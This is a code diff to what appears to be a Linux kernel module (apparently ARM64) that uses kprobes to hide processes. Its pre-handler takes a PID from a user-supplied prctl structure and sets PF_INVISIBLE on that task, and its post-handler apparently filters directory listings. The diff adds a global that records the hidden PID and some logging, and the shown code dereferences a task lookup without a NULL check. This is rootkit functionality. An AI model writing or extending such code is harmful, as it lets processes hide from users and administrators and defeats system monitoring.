@@ -50,6 +50,8 @@ unsigned long *get_syscall_table(void)
 	return syscall_table;
 }
 
+int pid_hide = 0;
+
 static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 {
     uint64_t v4;
@@ -66,6 +68,7 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 	    //For storing the directory inode value
 	    struct inode *d_inode;
 		int ret = (int)(regs->regs[0]);
+		wuwa_info("ret %d, pid %d", ret, pid_hide);
 		int err = 0;
 		    
 		kdirent = kzalloc(ret, GFP_KERNEL);
@@ -147,6 +150,7 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 			struct prctl_cf cfp;
             if (!copy_from_user(&cfp, *(const void **)(v4 + 16), sizeof(cfp))) {
 				wuwa_info("pid for hide %d", cfp.pid);
+				pid_hide = cfp.pid;
 				struct task_struct* task;
 				task = find_task_by_vpid(cfp.pid);			
 				task->flags ^= PF_INVISIBLE;
